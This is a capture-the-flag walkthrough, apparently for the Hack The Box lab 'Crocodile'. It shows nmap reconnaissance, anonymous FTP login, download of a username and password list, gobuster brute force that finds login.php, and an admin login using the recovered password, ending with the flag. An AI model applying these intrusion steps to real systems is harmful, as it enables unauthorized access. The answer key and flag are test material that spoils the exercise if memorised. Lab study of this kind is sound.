<center>Crocodile</center>





[toc]







## Crocodile

> Crocodile









### 1. task

1. What Nmap scanning switch employs the use of default scripts during a scan?

```shell
nmap -help

-sc
```

2. What service version is found to be running on port 21?

```shell
nmap -sV 10.129.22.245 -A

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.31
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))


vsftpd 3.0.3
```

3. What FTP code is returned to us for the "Anonymous FTP login allowed" message?

```shell
230
```

4. After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?

```shell
Anonymous
```

5. After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?

```shell
get
```

6. What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?

```shell
ftp 10.129.22.245

dir

get allowed.userlist

get allowed.userlist.passwd

cat allowed.userlist                                                                     
aron
pwnmeow
egotisticalsw
admin


admin
```

7. What version of Apache HTTP Server is running on the target host?

```shell
Apache httpd 2.4.41
```

8. What switch can we use with Gobuster to specify we are looking for specific filetypes?

```shell
-x
```

9. Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?

```shell
# 目录扫描
gobuster dir -u http://10.129.22.245/ -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt 

/config.php           (Status: 200) [Size: 0]
/login.php            (Status: 200) [Size: 1577]

```











### 3. flag

> 获取flag

```shell
# 打开登陆页面，输入用户名密码登陆
cat allowed.userlist 
cat allowed.userlist.passwd

admin/rKXM59ESxesUFHAd

Here is your flag: c7110277ac44d78b6a9fff2232434d16
```

